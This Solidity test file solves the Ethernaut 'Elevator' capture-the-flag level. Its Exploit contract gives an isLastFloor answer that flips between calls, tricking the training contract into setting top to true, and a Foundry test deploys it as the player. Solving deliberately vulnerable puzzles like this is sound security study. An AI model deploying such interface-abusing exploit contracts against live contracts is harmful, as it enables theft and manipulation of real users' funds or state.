// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract Exploit {
    bool public calledFirst = true;

    function isLastFloor(uint256) external returns (bool) {
        if (calledFirst) {
            calledFirst = !calledFirst;
            return false;
        } else {
            calledFirst = !calledFirst;
            return true;
        }
    }

    function callElevator(Elevator _victim, uint256 _floor) public {
        Elevator elevator = Elevator(_victim);

        elevator.goTo(_floor);
    }
}

contract TestElevator is BaseTest {
    Elevator private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */
        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player);

        Exploit exploiter = new Exploit();

        // trigger the exploit
        exploiter.callElevator(level, 10);

        assertEq(level.top(), true);

        vm.stopPrank();
    }
}
